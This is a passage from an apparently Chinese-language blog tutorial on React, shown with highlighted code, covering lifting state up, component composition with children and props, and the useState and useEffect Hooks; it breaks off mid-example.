class="hljs-attr">onTemperatureChange</span>=<span class="hljs-string">&#123;this.handleCelsiusChange&#125;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">scale</span>=<span class="hljs-string">&quot;f&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">temperature</span>=<span class="hljs-string">&#123;fahrenheit&#125;</span>          <span class="hljs-attr">onTemperatureChange</span>=<span class="hljs-string">&#123;this.handleFahrenheitChange&#125;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">BoilingVerdict</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">celsius</span>=<span class="hljs-string">&#123;parseFloat(celsius)&#125;</span> /&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>附带一些转换函数</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">toCelsius</span>(<span class="hljs-params">fahrenheit</span>) &#123;<br>  <span class="hljs-keyword">return</span> (fahrenheit - <span class="hljs-number">32</span>) * <span class="hljs-number">5</span> / <span class="hljs-number">9</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">toFahrenheit</span>(<span class="hljs-params">celsius</span>) &#123;<br>  <span class="hljs-keyword">return</span> (celsius * <span class="hljs-number">9</span> / <span class="hljs-number">5</span>) + <span class="hljs-number">32</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tryConvert</span>(<span class="hljs-params">temperature, convert</span>) &#123;<br>  <span class="hljs-keyword">const</span> input = <span class="hljs-built_in">parseFloat</span>(temperature);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(input)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> output = <span class="hljs-title function_">convert</span>(input);<br>  <span class="hljs-keyword">const</span> rounded = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(output * <span class="hljs-number">1000</span>) / <span class="hljs-number">1000</span>;<br>  <span class="hljs-keyword">return</span> rounded.<span class="hljs-title function_">toString</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>小结</strong></p><p>在 React 应用中，任何可变数据应当只有一个相对应的唯一“数据源”。通常，state 都是首先添加到需要渲染数据的组件中去。然后，如果其他组件也需要这个 state，那么你可以将它提升至这些组件的最近共同父组件中。你应当依靠<a href="https://react.docschina.org/docs/state-and-lifecycle.html#the-data-flows-down">自上而下的数据流</a>，而不是尝试在不同组件间同步 state。</p><p>虽然提升 state 方式比双向绑定方式需要编写更多的“样板”代码，但带来的好处是，排查和隔离 bug 所需的工作量将会变少。由于“存在”于组件中的任何 state，仅有组件自己能够修改它，因此 bug 的排查范围被大大缩减了。此外，你也可以使用自定义逻辑来拒绝或转换用户的输入。</p><p>如果某些数据可以由 props 或 state 推导得出，那么它就不应该存在于 state 中。举个例子，本例中我们没有将 <code>celsiusValue</code> 和 <code>fahrenheitValue</code> 一起保存，而是仅保存了最后修改的 <code>temperature</code> 和它的 <code>scale</code>。这是因为另一个输入框的温度值始终可以通过这两个值以及组件的 <code>render()</code> 方法获得。这使得我们能够清除输入框内容，亦或是，在不损失用户操作的输入框内数值精度的前提下对另一个输入框内的转换数值做四舍五入的操作。</p><p>当你在 UI 中发现错误时，可以使用 <a href="https://github.com/facebook/react/tree/master/packages/react-devtools">React 开发者工具</a> 来检查问题组件的 props，并且按照组件树结构逐级向上搜寻，直到定位到负责更新 state 的那个组件。这使得你能够追踪到产生 bug 的源头：</p><h3 id="26-React组合"><a href="#26-React组合" class="headerlink" title="26. React组合"></a>26. React组合</h3><p><strong>包含关系</strong></p><p>有些组件无法提前知晓它们子组件的具体内容。在 <code>Sidebar</code>（侧边栏）和 <code>Dialog</code>（对话框）等展现通用容器（box）的组件中特别容易遇到这种情况。</p><p>我们建议这些组件使用一个特殊的 <code>children</code> prop 来将他们的子组件传递到渲染结果中：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FancyBorder</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>&#x27;<span class="hljs-attr">FancyBorder</span> <span class="hljs-attr">FancyBorder-</span>&#x27; + <span class="hljs-attr">props.color</span>&#125;&gt;</span></span><br><span class="language-xml">      &#123;props.children&#125;    </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>这使得别的组件可以通过 JSX 嵌套，将任意组件作为子组件传递给它们。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">WelcomeDialog</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FancyBorder</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;blue&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-title&quot;</span>&gt;</span></span><br><span class="language-xml">          Welcome      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-message&quot;</span>&gt;</span></span><br><span class="language-xml">          Thank you for visiting our spacecraft!      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>   </span><br><span class="language-xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">FancyBorder</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&lt;FancyBorder&gt;</code> JSX 标签中的所有内容都会作为一个 <code>children</code> prop 传递给 <code>FancyBorder</code> 组件。因为 <code>FancyBorder</code> 将 <code>&#123;props.children&#125;</code> 渲染在一个 <code>&lt;div&gt;</code> 中，被传递的这些子组件最终都会出现在输出结果中。</p><p>少数情况下，你可能需要在一个组件中预留出几个“洞”。这种情况下，我们可以不使用 <code>children</code>，而是自行约定：将所需内容传入 props，并使用相应的 prop。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SplitPane</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;SplitPane&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;SplitPane-left&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.left&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;SplitPane-right&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.right&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SplitPane</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">left</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Contacts</span> /&gt;</span></span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">      right=&#123;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Chat</span> /&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&lt;Contacts /&gt;</code> 和 <code>&lt;Chat /&gt;</code> 之类的 React 元素本质就是对象（object），所以你可以把它们当作 props，像其他数据一样传递。这种方法可能使你想起别的库中“槽”（slot）的概念，但在 React 中没有“槽”这一概念的限制，你可以将任何东西作为 props 进行传递。</p><p><strong>特例关系</strong></p><p>有些时候，我们会把一些组件看作是其他组件的特殊实例，比如 <code>WelcomeDialog</code> 可以说是 <code>Dialog</code> 的特殊实例。</p><p>在 React 中，我们也可以通过组合来实现这一点。“特殊”组件可以通过 props 定制并渲染“一般”组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dialog</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FancyBorder</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;blue&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-title&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.title&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-message&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.message&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FancyBorder</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">WelcomeDialog</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Dialog</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Welcome&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;Thank you for visiting our spacecraft!&quot;</span> /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>组合也同样适用于以 class 形式定义的组件。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dialog</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FancyBorder</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;blue&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-title&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.title&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Dialog-message&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.message&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      &#123;props.children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FancyBorder</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SignUpDialog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSignUp</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSignUp</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">login</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Dialog</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Mars Exploration Program&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;How should we refer to you?&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.login&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">               <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleSignUp&#125;</span>&gt;</span></span><br><span class="language-xml">          Sign Me Up!</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Dialog</span>&gt;</span></span><br>    );<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">login</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">handleSignUp</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">`Welcome aboard, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.state.login&#125;</span>!`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="27-hook"><a href="#27-hook" class="headerlink" title="27. hook"></a>27. hook</h3><p>Hook是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。</p><p>这个例子用来显示一个计数器。当你点击按钮，计数器的值就会增加：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Example</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 声明一个新的叫做 “count” 的 state 变量</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You clicked &#123;count&#125; times<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(count + 1)&#125;&gt;</span><br><span class="language-xml">        Click me</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>你可以在一个组件中多次使用 State Hook：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ExampleWithManyStates</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 声明多个 state 变量！</span><br>  <span class="hljs-keyword">const</span> [age, setAge] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">42</span>);<br>  <span class="hljs-keyword">const</span> [fruit, setFruit] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;banana&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [todos, setTodos] = <span class="hljs-title function_">useState</span>([&#123; <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;Learn Hooks&#x27;</span> &#125;]);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用State Hook</strong></p><p>深入了解<code>useState</code></p><p><strong><code>useState</code> 需要哪些参数？</strong> <code>useState()</code> 方法里面唯一的参数就是初始 state。不同于 class 的是，我们可以按照需要使用数字或字符串对其进行赋值，而不一定是对象。在示例中，只需使用数字来记录用户点击次数，所以我们传了 <code>0</code> 作为变量的初始 state。（如果我们想要在 state 中存储两个不同的变量，只需调用 <code>useState()</code> 两次即可。）</p><p><strong><code>useState</code> 方法的返回值是什么？</strong> 返回值为：当前 state 以及更新 state 的函数。这就是我们写 <code>const [count, setCount] = useState()</code> 的原因。这与 class 里面 <code>this.state.count</code> 和 <code>this.setState</code> 类似，唯一区别就是你需要成对的获取它们。</p><p>以此了解下例：声明了一个叫 <code>count</code> 的 state 变量，然后把它设为 <code>0</code>。React 会在重复渲染时记住它当前的值，并且提供最新的值给函数。我们可以通过调用 <code>setCount</code> 来更新当前的 <code>count</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Example</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 声明一个叫 &quot;count&quot; 的 state 变量</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>读取State：在函数中，我们可以直接用 <code>count</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;p&gt;<span class="hljs-title class_">You</span> clicked &#123;count&#125; times&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>更新State：在函数中，我们已经有了 <code>setCount</code> 和 <code>count</code> 变量，所以我们不需要 <code>this</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;button onClick=&#123;<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>)&#125;&gt;<br>  <span class="hljs-title class_">Click</span> me<br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><p>使用多个state变量</p><p>将 state 变量声明为一对 <code>[something, setSomething]</code> 也很方便，因为如果我们想使用多个 state 变量，它允许我们给不同的 state 变量取不同的名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx\">function ExampleWithManyStates() &#123;<br>  // 声明多个 state 变量<br>  const [age, setAge] = useState(42);<br>  const [fruit, setFruit] = useState(&#x27;banana&#x27;);<br>  const [todos, setTodos] = useState([&#123; text: &#x27;学习 Hook&#x27; &#125;]);<br></code></pre></td></tr></table></figure><p>在以上组件中，我们有局部变量 <code>age</code>，<code>fruit</code> 和 <code>todos</code>，并且我们可以单独更新它们：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleOrangeClick</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 和 this.setState(&#123; fruit: &#x27;orange&#x27; &#125;) 类似</span><br>  <span class="hljs-title function_">setFruit</span>(<span class="hljs-string">&#x27;orange&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>你<strong>不必</strong>使用多个 state 变量。State 变量可以很好地存储对象和数组，因此，你仍然可以将相关数据分为一组。然而，不像 class 中的 <code>this.setState</code>，更新 state 变量总是<em>替换</em>它而不是合并它。</p><p><strong>使用Effect Hook：</strong></p><p>Hook 是一些可以让你在函数组件里“钩入” React state 及生命周期等特性的函数。React 内置了一些像 <code>useState</code> 这样的 Hook。你也可以创建你自己的 Hook 来复用不同组件之间的状态逻辑。</p><p><code>useEffect</code> 是一个 Effect Hook，给函数组件增加了操作副作用的能力。它跟 class 组件中的 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 具有相同的用途，只不过被合并成了一个 API。</p><p>例如，下面这个组件在 React 更新 DOM 后会设置一个页面标题：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Example</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">// 相当于 componentDidMount 和 componentDidUpdate:</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 使用浏览器的 API 更新页面标题</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`You clicked <span class="hljs-subst">$&#123;count&#125;</span> times`</span>;<br>  &#125;);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You clicked &#123;count&#125; times<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(count + 1)&#125;&gt;</span><br><span class="language-xml">        Click me</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>当你调用 <code>useEffect</code> 时，就是在告诉 React 在完成对 DOM 的更改后运行你的“副作用”函数。由于副作用函数是在组件内声明的，所以它们可以访问到组件的 props 和 state。默认情况下，React 会在每次渲染后调用副作用函数 —— <strong>包括</strong>第一次渲染的时候。</p><p>副作用函数还可以通过返回一个函数来指定如何“清除”副作用。例如，在下面的组件中使用副作用函数来订阅好友的在线状态，并通过取消订阅来进行清除操作：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FriendStatus</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> [isOnline, setIsOnline] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleStatusChange</span>(<span 